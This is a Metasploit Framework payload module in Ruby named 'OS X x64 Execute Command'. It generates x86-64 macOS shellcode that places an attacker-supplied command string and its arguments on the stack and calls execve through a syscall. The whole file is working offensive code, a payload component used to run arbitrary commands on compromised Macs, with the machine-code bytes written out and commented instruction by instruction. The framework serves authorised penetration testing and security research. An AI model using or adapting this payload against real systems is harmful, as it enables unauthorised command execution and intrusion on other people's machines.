##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'

module Metasploit3

  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X x64 Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => [ 'argp <argp[at]census-labs.com>',
                           'joev <joev[at]metasploit.com>' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86_64
    ))

    # exec payload options
    register_options([
      OptString.new('CMD',  [ true,  "The command string to execute" ])
    ], self.class)
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate
    cmd_str = datastore['CMD'] || ''
    # Split the cmd string into arg chunks
    cmd_parts = Shellwords.shellsplit(cmd_str)
    cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact
    arg_str = cmd_parts.map { |a| "#{a}\x00" }.join
    call = "\xe8" + [arg_str.length].pack('V')
    payload =
      "\x48\x31\xc0" +                                # xor rax, rax
      call +                                          # call CMD.len
      arg_str  +                                      # CMD
      "\x5f" +                                        # pop rdi
      if cmd_parts.length > 1
        "\x48\x89\xf9" +                            # mov rcx, rdi
        "\x50" +                                    # push null
        # for each arg, push its current memory location on to the stack
        cmd_parts[1..-1].each_with_index.map do |arg, idx|
          "\x48\x81\xc1" +                        # add rcx + ...
          [cmd_parts[idx].length+1].pack('V') +   #
          "\x51"                                  # push rcx (build str array)
        end.join
      else
        "\x50"                                      # push null
      end +
      "\x57"+                                         # push rdi
      "\x48\x89\xe6"+	                                # mov rsi, rsp
      "\x48\xc7\xc0\x3b\x00\x00\x02" +                # mov rax, 0x200003b (execve)
      "\x0f\x05"                                      # syscall
  end
end
